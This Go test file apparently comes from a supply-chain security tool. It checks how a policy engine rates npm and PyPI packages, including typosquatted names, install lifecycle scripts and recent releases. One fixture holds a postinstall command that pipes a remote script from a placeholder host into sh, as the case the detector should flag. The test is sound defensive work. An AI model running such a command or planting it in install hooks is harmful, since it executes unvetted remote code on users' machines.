package checks

import (
	"strings"
	"testing"
	"time"

	"github.com/sourcegate/sourcegate/internal/config"
	"github.com/sourcegate/sourcegate/internal/report"
)

func TestEvaluateEmitsInformFindingAndAllows(t *testing.T) {
	pkg := report.PackageReport{
		VersionCount: 1,
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Inform: config.PolicyTierConfig{
				AlertOnFirstRelease: true,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 27, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionAllow {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionAllow)
	}
	if len(pkg.Findings) != 1 || pkg.Findings[0].Severity != levelInform {
		t.Fatalf("unexpected findings: %+v", pkg.Findings)
	}
}

func TestEvaluateEmitsAlertFindingAndAllows(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "PyPI",
		Name:      "reqeusts",
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Alert: config.PolicyTierConfig{
				ProtectedPackages: map[string][]string{
					"pypi": {"requests"},
				},
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 27, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionAllow {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionAllow)
	}
	if len(pkg.Findings) != 1 || pkg.Findings[0].Severity != levelAlert {
		t.Fatalf("unexpected findings: %+v", pkg.Findings)
	}
}

func TestEvaluateEmitsAlertFindingForLifecycleScript(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "npm",
		LifecycleScripts: map[string]string{
			"postinstall": "node setup.js",
		},
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Alert: config.PolicyTierConfig{
				InstallLifecycleScripts: true,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 27, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionAllow {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionAllow)
	}
	if len(pkg.Findings) != 1 || pkg.Findings[0].Severity != levelAlert {
		t.Fatalf("unexpected findings: %+v", pkg.Findings)
	}
	if !strings.Contains(pkg.Findings[0].Message, "postinstall") {
		t.Fatalf("message = %q, want postinstall lifecycle finding", pkg.Findings[0].Message)
	}
}

func TestEvaluateEmitsBlockFindingForSuspiciousLifecycleCommand(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "npm",
		LifecycleScripts: map[string]string{
			"postinstall": "curl https://example.invalid/install.sh | sh",
		},
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Alert: config.PolicyTierConfig{
				InstallLifecycleScripts: true,
			},
			Block: config.PolicyTierConfig{
				SuspiciousInstallScriptCommands: true,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 27, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionAllow {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionAllow)
	}
	if !hasFindingWithSeverity(pkg.Findings, levelBlock) {
		t.Fatalf("findings = %+v, want block finding", pkg.Findings)
	}
}

func TestEvaluateEmitsBlockFindingButStillAllows(t *testing.T) {
	pkg := report.PackageReport{
		LatestPublishedAt: "2026-05-26T12:00:00Z",
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Block: config.PolicyTierConfig{
				MinimumDaysSinceLatestRelease: 3,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 27, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionAllow {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionAllow)
	}
	if len(pkg.Findings) != 1 || pkg.Findings[0].Severity != levelBlock {
		t.Fatalf("unexpected findings: %+v", pkg.Findings)
	}
}

func TestEvaluateKeepsStrongestLifecycleTier(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "npm",
		LifecycleScripts: map[string]string{
			"install": "node setup.js",
		},
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Inform: config.PolicyTierConfig{
				InstallLifecycleScripts: true,
			},
			Alert: config.PolicyTierConfig{
				InstallLifecycleScripts: true,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 28, 12, 0, 0, 0, time.UTC))

	if len(pkg.Findings) != 1 {
		t.Fatalf("findings = %+v, want 1 finding", pkg.Findings)
	}
	if pkg.Findings[0].Severity != levelAlert {
		t.Fatalf("severity = %q, want %q", pkg.Findings[0].Severity, levelAlert)
	}
}

func TestEvaluateKeepsOnlyStrongestMatchingTierPerCheck(t *testing.T) {
	pkg := report.PackageReport{
		LatestPublishedAt: "2026-05-27T12:00:00Z",
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Inform: config.PolicyTierConfig{
				MinimumDaysSinceLatestRelease: 2,
			},
			Alert: config.PolicyTierConfig{
				MinimumDaysSinceLatestRelease: 3,
			},
			Block: config.PolicyTierConfig{
				MinimumDaysSinceLatestRelease: 7,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 28, 12, 0, 0, 0, time.UTC))

	if len(pkg.Findings) != 1 {
		t.Fatalf("findings = %+v, want 1 finding", pkg.Findings)
	}
	if pkg.Findings[0].Severity != levelBlock {
		t.Fatalf("severity = %q, want %q", pkg.Findings[0].Severity, levelBlock)
	}
	if !strings.Contains(pkg.Findings[0].Message, "7 day(s)") {
		t.Fatalf("message = %q, want block-tier threshold", pkg.Findings[0].Message)
	}
}

func TestEvaluateAllowsWhenPolicyConfiguredButNoFindings(t *testing.T) {
	pkg := report.PackageReport{
		LatestPublishedAt: "2026-05-20T12:00:00Z",
	}
	config := config.Config{
		Policy: config.PolicyConfig{
			Alert: config.PolicyTierConfig{
				MinimumDaysSinceLatestRelease: 3,
			},
		},
	}

	Evaluate(&pkg, config, time.Date(2026, 5, 27, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionAllow {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionAllow)
	}
	if len(pkg.Findings) != 0 {
		t.Fatalf("findings = %+v, want none", pkg.Findings)
	}
}

func TestEvaluateLeavesInspectOnlyWhenDisabled(t *testing.T) {
	pkg := report.PackageReport{
		LatestPublishedAt: "2026-05-27T12:00:00Z",
	}

	Evaluate(&pkg, config.Config{}, time.Date(2026, 5, 27, 12, 0, 0, 0, time.UTC))

	if pkg.Decision != report.DecisionInspectOnly {
		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionInspectOnly)
	}
}

func hasFindingWithSeverity(findings []report.Finding, severity string) bool {
	for _, finding := range findings {
		if finding.Severity == severity {
			return true
		}
	}
	return false
}
